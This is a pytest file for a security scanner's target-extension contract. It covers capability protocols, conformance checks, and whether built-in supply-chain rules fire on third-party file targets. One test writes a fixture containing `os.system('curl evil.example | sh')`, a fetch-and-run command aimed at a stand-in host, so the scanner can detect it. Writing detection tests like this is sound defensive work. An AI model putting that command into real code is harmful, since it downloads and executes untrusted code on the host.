"""The extension contract's second half: what a capability actually promises.

Every test here inverts a *behaviour*. The point is not that the protocols exist
— it is that a target which satisfies them runs the built-in rules, and one that
lies about itself is caught rather than quietly running nothing.
"""

from collections.abc import Iterator, Sequence
from pathlib import Path

import pytest
from guardana.core.profile.loader import default_profile
from guardana.core.registry import Registry
from guardana.core.rule import Rule
from guardana.core.runner import Runner
from guardana.core.source import PythonSource, UnreadSource, read_source
from guardana.core.target import Capability, ChatMessage, FileReader, Target, TargetKind
from guardana.core.target.protocols import ChatEndpoint, unmet_surfaces
from guardana.testing.conformance import TargetContractError, assert_target_conforms


class _FlatFileTarget(Target):
    """A file target a third party could plausibly write: no Guardana class inherited."""

    kind = TargetKind.ARTIFACT

    def __init__(self, root: Path) -> None:
        self._root = root
        self._cache: dict[Path, PythonSource | None] = {}

    def capabilities(self) -> set[Capability]:
        return {Capability.READ_FILES}

    @property
    def ref(self) -> str:
        return f"flat://{self._root}"

    def iter_files(self, suffixes: tuple[str, ...] | None = None) -> Iterator[Path]:
        for path in sorted(self._root.rglob("*")):
            if path.is_file() and (suffixes is None or path.suffix in suffixes):
                yield path

    def python_source(self, path: Path) -> PythonSource | None:
        if path not in self._cache:
            result = read_source(path, limit=1_000_000)
            self._cache[path] = None if isinstance(result, UnreadSource) else result
        return self._cache[path]

    def unread_sources(self) -> tuple[UnreadSource, ...]:
        return ()


class _LiarTarget(Target):
    """Declares a capability it has no surface for — the case with no error before."""

    kind = TargetKind.ARTIFACT

    def capabilities(self) -> set[Capability]:
        return {Capability.READ_FILES}

    @property
    def ref(self) -> str:
        return "liar://"


class _QuietTarget(Target):
    """Implements the surface and forgets to declare it. Fails open, silently."""

    kind = TargetKind.ENDPOINT

    def capabilities(self) -> set[Capability]:
        return set()

    @property
    def ref(self) -> str:
        return "quiet://"

    @property
    def model(self) -> str:
        return "m"

    def chat(self, messages: Sequence[ChatMessage]) -> str:
        return "hello"


def test_a_third_party_file_target_runs_the_built_in_artifact_rules(tmp_path: Path) -> None:
    """The promise `docs/extending.md` made in 0.1 and could not keep until now.

    A target that inherits nothing of ours, declares `READ_FILES` and implements
    the `FileReader` surface must be scannable by the built-in artifact rules. It
    was not: all nineteen asked `isinstance(target, ArtifactTarget)` and returned
    nothing, so the scan came back clean on a file that plainly is not.
    """
    (tmp_path / "loader.py").write_text("import os\nos.system('curl evil.example | sh')\n")

    result = Runner(Registry.discover(), default_profile()).run(_FlatFileTarget(tmp_path))

    assert result.errors == ()
    assert any(f.rule_id.startswith("guardana.supply_chain") for f in result.findings), (
        f"a third-party file target found nothing; rules that ran: {result.rules_run}"
    )


def test_the_same_target_is_recognised_by_the_capability_protocol(tmp_path: Path) -> None:
    assert isinstance(_FlatFileTarget(tmp_path), FileReader)
    assert not isinstance(_LiarTarget(), FileReader)


def test_declaring_a_capability_without_its_surface_is_an_error_not_silence() -> None:
    """One error naming the missing surface, instead of nineteen rules failing."""
    result = Runner(Registry.discover(), default_profile()).run(_LiarTarget())

    assert [e.stage for e in result.errors] == ["capability"]
    assert "read_files" in result.errors[0].reason
    assert "FileReader" in result.errors[0].reason


def test_the_conformance_kit_catches_a_target_that_under_declares() -> None:
    """The direction that produces no error at all: a clean run over nothing.

    A target that can chat and does not say so is skipped by every endpoint rule.
    The scan is green, the coverage is zero, and nothing in the report distinguishes
    that from a model with no problems.
    """
    with pytest.raises(TargetContractError, match="does not declare chat"):
        assert_target_conforms(_QuietTarget())


def test_the_conformance_kit_accepts_a_correct_target(tmp_path: Path) -> None:
    assert_target_conforms(_FlatFileTarget(tmp_path))


def test_unmet_surfaces_names_every_gap_at_once() -> None:
    # One run says everything that is wrong; fix-and-retry is how a contract
    # check turns into an afternoon.
    assert unmet_surfaces(_LiarTarget()) == ("read_files (needs FileReader)",)
    assert unmet_surfaces(_QuietTarget()) == ()


def test_every_capability_with_a_surface_is_reachable_from_a_built_in_rule() -> None:
    """A protocol nothing asks for is a protocol nobody has run.

    `guardana.targets` sat in the entry-point table from 0.1 with no registrant
    anywhere, and `pack validate` shipped accusing every pack that had a target of
    not registering one. A documented seam nothing exercises is the same shape.
    """
    from guardana.core.target.protocols import CAPABILITY_SURFACE  # noqa: PLC0415

    needed = {c for rule in Registry.discover().rules() for c in rule.meta.required_capabilities}
    unused = sorted(str(c) for c in CAPABILITY_SURFACE if c not in needed)
    assert not unused, f"capabilities with a surface and no rule asking for them: {unused}"


def test_the_chat_protocol_matches_the_built_in_endpoint_target() -> None:
    from guardana.core.target import EndpointTarget  # noqa: PLC0415
    from guardana.core.testing import ScriptedTransport  # noqa: PLC0415

    endpoint = EndpointTarget("http://x", "m", transport=ScriptedTransport("hi"))
    assert isinstance(endpoint, ChatEndpoint)


def test_the_flat_target_reads_each_file_once(tmp_path: Path) -> None:
    # The cost model is part of the contract, not an implementation detail of the
    # built-in target: a `python_source` that re-reads satisfies the signature and
    # turns a linear scan into a quadratic one.
    (tmp_path / "a.py").write_text("x = 1\n")
    target = _FlatFileTarget(tmp_path)
    first = target.python_source(tmp_path / "a.py")

    assert target.python_source(tmp_path / "a.py") is first


def test_a_rule_declaring_no_capability_is_not_offered_a_surface_it_cannot_use() -> None:
    # Selection still belongs to the runner and to `required_capabilities`. The
    # protocol is the narrower question asked at the point of use, not a second
    # selection mechanism that could disagree with the first.
    rules = [r for r in Registry.discover().rules() if r.meta.target_kind is TargetKind.ARTIFACT]
    assert rules
    assert all(Capability.READ_FILES in r.meta.required_capabilities for r in rules), (
        "an artifact rule that does not declare read_files would be planned against "
        "a target with no files and reported as a rule that ran"
    )


def test_rule_is_still_the_base_class_third_parties_implement() -> None:
    assert issubclass(_FlatFileTarget, Target)
    assert not issubclass(_FlatFileTarget, Rule)


def test_the_conformance_kit_refuses_a_target_with_no_reference() -> None:
    """A finding has to name what it is about, and `ref` is the only thing that can."""

    class _Anonymous(_FlatFileTarget):
        @property
        def ref(self) -> str:
            return ""

    with pytest.raises(TargetContractError, match="empty `ref`"):
        assert_target_conforms(_Anonymous(Path()))


def test_the_conformance_kit_reports_every_problem_in_one_run() -> None:
    """Fix-and-retry is how a contract check turns into an afternoon."""

    class _Doubly(Target):
        kind = TargetKind.ARTIFACT

        def capabilities(self) -> set[Capability]:
            return {Capability.READ_FILES}

        @property
        def ref(self) -> str:
            return ""

    with pytest.raises(TargetContractError) as caught:
        assert_target_conforms(_Doubly())

    assert "read_files" in str(caught.value)
    assert "empty `ref`" in str(caught.value)
